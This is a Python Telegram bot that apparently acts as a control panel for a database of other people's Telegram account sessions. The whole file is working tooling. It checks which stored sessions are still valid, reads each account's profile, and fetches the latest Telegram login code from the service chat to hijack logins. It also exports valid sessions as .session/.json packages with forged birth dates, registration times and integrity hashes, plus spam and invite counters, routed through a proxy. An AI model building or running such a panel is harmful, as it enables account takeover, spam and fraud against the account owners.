import os
import json
import logging
import sqlite3
import zipfile
import tempfile
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from dotenv import load_dotenv
from pymongo import MongoClient
from telethon import TelegramClient, functions, types as telethon_types
from telethon.sessions import StringSession, SQLiteSession
from telethon.tl.functions.messages import GetHistoryRequest
from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest
from phonenumbers import parse, geocoder
from aiogram.dispatcher.middlewares import BaseMiddleware
from aiogram.dispatcher.handler import CancelHandler
from aiogram.contrib.fsm_storage.memory import MemoryStorage
import hashlib
import random
import string
import base64
import time

# Load .env
load_dotenv()

# Configuration
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
PANEL_TOKEN = os.getenv("PANEL_BOT_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")
ADMIN_ID = int(os.getenv("ADMIN_ID"))
LA_ADMIN_IDS = json.loads(os.getenv("LA_ADMIN_IDS", "[]"))

# Proxy settings
PROXY_HOST = os.getenv("PROXY_HOST")
PROXY_PORT = int(os.getenv("PROXY_PORT"))
PROXY_USER = os.getenv("PROXY_USER")
PROXY_PASS = os.getenv("PROXY_PASS")
proxy = ('socks5', PROXY_HOST, PROXY_PORT, True, PROXY_USER, PROXY_PASS)

# Database setup
mongo = MongoClient(MONGO_URI)
db = mongo["telegram_master"]
sessions_col = db["main_sessions"]
light_sessions_col = db["light_sessions"]
light_admins_col = db["light_admins"]
session_stats_col = db["session_stats"]

# Bot setup
logging.basicConfig(level=logging.INFO)
bot = Bot(token=PANEL_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

# Constants
DEFAULT_APP_ID = 2040
DEFAULT_APP_HASH = "b18441a1ff607e10a989891a5462e627"
DEFAULT_DEVICE = "103C53311M HP"
DEFAULT_APP_VERSION = "5.16.4 x64"
DEFAULT_ROLE = "После конвертации"
DEFAULT_AVATAR = "img/TeleRaptor.png"

# ================== UTILITY FUNCTIONS ==================

def generate_random_hash(length=32):
    """Generate random hash for date_of_birth_integrity"""
    return ''.join(random.choices(string.hexdigits.lower(), k=length))

def calculate_dob_integrity(timestamp):
    """Calculate integrity hash for date of birth"""
    data = str(timestamp).encode()
    return hashlib.md5(data).hexdigest()

def generate_extra_params():
    """Generate random extra_params string"""
    chars = string.ascii_letters + string.digits
    parts = [
        ''.join(random.choices(chars, k=20)),
        ''.join(random.choices(chars, k=32)),
        ''.join(random.choices(chars, k=24)),
        ''.join(random.choices(chars, k=16))
    ]
    return "".join(parts)

def get_default_app_config():
    """Return default app configuration"""
    return {
        "app_id": DEFAULT_APP_ID,
        "app_hash": DEFAULT_APP_HASH,
        "sdk": "Windows 10",
        "device": DEFAULT_DEVICE,
        "app_version": DEFAULT_APP_VERSION,
        "lang_pack": "en",
        "system_lang_pack": "en-US",
        "twoFA": None,
        "role": DEFAULT_ROLE,
        "avatar": DEFAULT_AVATAR
    }

def convert_session_to_sqlite(session_string, phone):
    """Convert StringSession to SQLite format"""
    temp_dir = tempfile.mkdtemp()
    session_file = os.path.join(temp_dir, f"{phone}.session")
    
    # Create SQLite session from string
    SQLiteSession(session_file).save(StringSession(session_string))
    
    # Read binary data
    with open(session_file, 'rb') as f:
        sqlite_data = f.read()
    
    # Cleanup
    os.unlink(session_file)
    os.rmdir(temp_dir)
    
    return sqlite_data

# ================== ACCESS CONTROL ==================

def is_main_admin(uid):
    return uid == ADMIN_ID

def is_light_admin(uid):
    return uid in LA_ADMIN_IDS or light_admins_col.find_one({"user_id": uid})

class AccessControlMiddleware(BaseMiddleware):
    async def on_pre_process_message(self, message: types.Message, data: dict):
        if not (is_main_admin(message.from_user.id) or is_light_admin(message.from_user.id)):
            raise CancelHandler()

    async def on_pre_process_callback_query(self, callback_query: types.CallbackQuery, data: dict):
        if not (is_main_admin(callback_query.from_user.id) or is_light_admin(callback_query.from_user.id)):
            raise CancelHandler()

dp.middleware.setup(AccessControlMiddleware())

# ================== SESSION DATA GENERATION ==================

async def generate_full_session_data(session_info, client, me):
    """Generate complete session data in required format"""
    default_config = get_default_app_config()
    
    # Get or create session stats
    stats = session_stats_col.find_one({"phone": session_info["phone"]}) or {
        "spam_count": 0,
        "invites_count": 0,
        "last_connect": datetime.now().isoformat(),
        "register_time": int(time.time()) - random.randint(86400, 31536000),
        "success_registered": True,
        "last_check_time": 0
    }
    
    # Generate dates in correct format
    session_created_date = datetime.fromtimestamp(stats["register_time"]).strftime("%Y-%m-%dT%H:%M:%S+0300")
    last_connect_date = datetime.now().strftime("%Y-%m-%dT%H:%M:%S+0300")
    
    # Generate date of birth (18-40 years ago)
    dob_timestamp = int(time.time()) - random.randint(568025000, 1262304000)
    
    full_data = {
        **default_config,
        "id": me.id,
        "phone": session_info["phone"].replace("+", ""),
        "username": me.username or "",
        "date_of_birth": dob_timestamp,
        "date_of_birth_integrity": calculate_dob_integrity(dob_timestamp),
        "is_premium": getattr(me, 'premium', False),
        "premium_expiry": None,
        "first_name": me.first_name or "",
        "last_name": me.last_name or "",
        "has_profile_pic": bool(getattr(me, 'photo', False)),
        "spamblock": None,
        "spamblock_end_date": None,
        "session_file": session_info["phone"].replace("+", ""),
        "stats_spam_count": stats["spam_count"],
        "stats_invites_count": stats["invites_count"],
        "last_connect_date": last_connect_date,
        "session_created_date": session_created_date,
        "app_config_hash": None,
        "extra_params": generate_extra_params(),
        "proxy": None,
        "last_check_time": stats["last_check_time"],
        "register_time": stats["register_time"],
        "success_registred": stats["success_registered"],
        "ipv6": False,
        "session": session_info["session"]
    }
    
    return full_data

# ================== SESSION EXPORT ==================

async def export_sessions(user_id):
    """Export all sessions in required format"""
    if is_main_admin(user_id):
        sessions = list(sessions_col.find({}))
    else:
        sessions = list(light_sessions_col.find({"owner_id": user_id}))
    
    if not sessions:
        await bot.send_message(user_id, "❌ No sessions found.")
        return
    
    message = await bot.send_message(user_id, "⏳ Starting session export, please wait...")
    
    temp_dir = tempfile.mkdtemp()
    zip_path = os.path.join(temp_dir, f"sessions_export_{user_id}.zip")
    exported_count = 0
    
    try:
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for i, session in enumerate(sessions, 1):
                try:
                    client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
                    await client.connect()
                    
                    if await client.is_user_authorized():
                        me = await client.get_me()
                        phone = session["phone"].replace("+", "")
                        
                        # Generate full session data
                        session_data = await generate_full_session_data(session, client, me)
                        
                        # Save JSON
                        json_filename = f"{phone}.json"
                        json_path = os.path.join(temp_dir, json_filename)
                        with open(json_path, 'w', encoding='utf-8') as f:
                            json.dump(session_data, f, indent=2, ensure_ascii=False)
                        zipf.write(json_path, json_filename)
                        
                        # Convert and save SQLite session
                        sqlite_data = convert_session_to_sqlite(session["session"], phone)
                        sqlite_filename = f"{phone}.session"
                        sqlite_path = os.path.join(temp_dir, sqlite_filename)
                        with open(sqlite_path, 'wb') as f:
                            f.write(sqlite_data)
                        zipf.write(sqlite_path, sqlite_filename)
                        
                        exported_count += 1
                        
                        # Cleanup temp files
                        os.unlink(json_path)
                        os.unlink(sqlite_path)
                        
                        # Update progress every 5 sessions
                        if i % 5 == 0:
                            await message.edit_text(
                                f"⏳ Exporting sessions...\n"
                                f"Progress: {i}/{len(sessions)}\n"
                                f"Exported: {exported_count}"
                            )
                    
                except Exception as e:
                    logging.error(f"Error exporting session {session.get('phone')}: {str(e)}")
                finally:
                    await client.disconnect()
        
        if exported_count == 0:
            await message.edit_text("❌ No valid sessions to export.")
            return
        
        # Send ZIP archive
        with open(zip_path, 'rb') as zip_file:
            await bot.send_document(
                chat_id=user_id,
                document=zip_file,
                caption=f"✅ Successfully exported {exported_count} sessions\n"
                       "Each session includes:\n"
                       f"- [phone].json - Full session info in your required format\n"
                       f"- [phone].session - SQLite session file",
                reply_to_message_id=message.message_id
            )
        
    except Exception as e:
        logging.error(f"Export error: {str(e)}")
        await message.edit_text(f"❌ Export failed: {str(e)}")
    finally:
        # Cleanup
        if os.path.exists(zip_path):
            os.unlink(zip_path)
        if os.path.exists(temp_dir):
            os.rmdir(temp_dir)

# ================== COMMAND HANDLERS ==================

@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    if is_main_admin(message.from_user.id):
        keyboard = InlineKeyboardMarkup(row_width=2).add(
            InlineKeyboardButton("✅ Check Sessions", callback_data='log'),
            InlineKeyboardButton("📂 Export Valids", callback_data='loger'),
            InlineKeyboardButton("🧹 Delete Invalid", callback_data='validel'),
            InlineKeyboardButton("🔑 Get Telegram Code", callback_data='login'),
            InlineKeyboardButton("📨 FA Bot History", callback_data='fa'),
            InlineKeyboardButton("👥 Manage Light Admins", callback_data='manage_la'),
            InlineKeyboardButton("🗑 Session Management", callback_data='session_management')
        )
        await message.answer("👑 Welcome, Main Admin! Choose an action:", reply_markup=keyboard)
    elif is_light_admin(message.from_user.id):
        keyboard = InlineKeyboardMarkup(row_width=2).add(
            InlineKeyboardButton("✅ Check My Sessions", callback_data='log'),
            InlineKeyboardButton("➕ Add Sessions", callback_data='addla'),
            InlineKeyboardButton("🔑 Get Telegram Code", callback_data='login'),
            InlineKeyboardButton("📨 FA Bot History", callback_data='fa'),
            InlineKeyboardButton("🗑 Session Management", callback_data='session_management')
        )
        await message.answer("🛡 Welcome, Light Admin. Choose an action:", reply_markup=keyboard)
    else:
        await message.answer("❌ You don't have access to use this bot.")

@dp.callback_query_handler(lambda c: c.data == 'loger')
async def handle_export_sessions(callback_query: types.CallbackQuery):
    if not is_main_admin(callback_query.from_user.id):
        await callback_query.answer("❌ Access denied.")
        return
    
    await callback_query.answer("⏳ Starting session export...")
    await export_sessions(callback_query.from_user.id)

# ================== SESSION CHECK HANDLERS ==================

@dp.callback_query_handler(lambda c: c.data == 'log')
async def handle_check_sessions(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    await callback_query.answer("⏳ Checking sessions...")
    
    if is_main_admin(user_id):
        sessions = list(sessions_col.find({}))
    else:
        sessions = list(light_sessions_col.find({"owner_id": user_id}))
    
    if not sessions:
        await bot.send_message(user_id, "❌ No sessions found.")
        return
    
    message = await bot.send_message(user_id, "🔍 Starting session check...")
    results = []
    
    for i, session in enumerate(sessions, 1):
        client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
        try:
            await client.connect()
            if not await client.is_user_authorized():
                results.append(f"❌ {session['phone']} - Invalid session")
            else:
                me = await client.get_me()
                country = geocoder.description_for_number(parse(session['phone'], None), "en")
                premium = "✅" if getattr(me, 'premium', False) else "❌"
                results.append(
                    f"✅ {session['phone']} | ID: {me.id}\n"
                    f"👤 {me.first_name or ''} {me.last_name or ''} | @{me.username or 'none'}\n"
                    f"🌍 {country} | Premium: {premium}"
                )
            
            # Update progress
            if i % 5 == 0:
                await message.edit_text(
                    f"🔍 Checking sessions...\n"
                    f"Progress: {i}/{len(sessions)}\n"
                    f"Last checked: {session['phone']}"
                )
                
        except Exception as e:
            results.append(f"❌ {session['phone']} - Error: {str(e)}")
        finally:
            await client.disconnect()
    
    # Send results in chunks
    chunk_size = 15
    for i in range(0, len(results), chunk_size):
        chunk = results[i:i + chunk_size]
        await bot.send_message(
            user_id,
            "📋 Session check results:\n\n" + "\n\n".join(chunk)
        )

# ================== OTHER COMMAND HANDLERS ==================

@dp.message_handler(commands=['validel'])
async def cmd_validel(message: types.Message):
    if not is_main_admin(message.from_user.id):
        return await message.answer("❌ Not allowed.")

    sessions = list(sessions_col.find({}))
    deleted = 0
    
    for session in sessions:
        client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
        try:
            await client.connect()
            if not await client.is_user_authorized():
                sessions_col.delete_one({"_id": session["_id"]})
                deleted += 1
        except:
            sessions_col.delete_one({"_id": session["_id"]})
            deleted += 1
        finally:
            await client.disconnect()

    await message.answer(f"🧹 Invalid sessions removed: {deleted}")

@dp.message_handler(commands=['login'])
async def cmd_login(message: types.Message):
    if not (is_main_admin(message.from_user.id) or is_light_admin(message.from_user.id)):
        return

    args = message.get_args().strip()
    if not args.startswith('+'):
        await message.reply("❗️ Use format: /login +1234567890")
        return

    if is_main_admin(message.from_user.id):
        session = sessions_col.find_one({"phone": args})
    else:
        session = light_sessions_col.find_one({"phone": args, "owner_id": message.from_user.id})
    
    if not session:
        await message.reply("❌ Session not found.")
        return

    client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
    try:
        await client.connect()
        history = await client(GetHistoryRequest(
            peer=777000, 
            limit=1, 
            offset_date=None,
            offset_id=0, 
            max_id=0, 
            min_id=0, 
            add_offset=0, 
            hash=0
        ))
        
        if history.messages:
            await message.reply(
                f"📨 Last Telegram code for {args}:\n\n"
                f"`{history.messages[0].message}`", 
                parse_mode="Markdown"
            )
        else:
            await message.reply("⚠️ No messages from Telegram.")
    except Exception as e:
        await message.reply(f"❌ Error: {e}")
    finally:
        await client.disconnect()

# ================== MAIN EXECUTION ==================

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)